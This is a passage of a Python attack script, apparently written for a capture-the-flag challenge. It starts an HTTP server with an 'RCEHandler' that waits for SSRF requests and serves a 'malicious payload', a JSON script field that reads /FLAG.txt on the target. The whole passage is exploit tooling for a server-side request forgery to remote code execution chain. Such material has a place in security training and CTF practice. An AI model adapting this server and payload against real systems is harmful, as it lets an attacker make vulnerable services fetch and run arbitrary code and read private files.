print("="*70)
print(f"Address: {HOST}:{PORT}")
print(f"Payload: {json.dumps({'script': 'open(\"/FLAG.txt\").read()'})}")
print("="*70)
print("\n[*] Starting server...")

# Create server
server = HTTPServer((HOST, PORT), RCEHandler)
server.timeout = 1  # 1 second timeout for handle_request

print(f"[+] Server listening on {HOST}:{PORT}")
print("[+] Ready to serve malicious payload")
print("[*] Waiting for SSRF requests...\n")

# Server loop with timeout to allow signal checking
request_count = 0
try:
    while running:
        server.handle_request()
        request_count += 1
except KeyboardInterrupt:
    print("\n[!] Keyboard interrupt received")
except Exception as e:
    print(f"\n[!] Server error: {e}")
finally:
    print(f"\n[*] Shutting down... (served {request_count} requests)")
    server.server_close()
    print("[+] Server stopped")

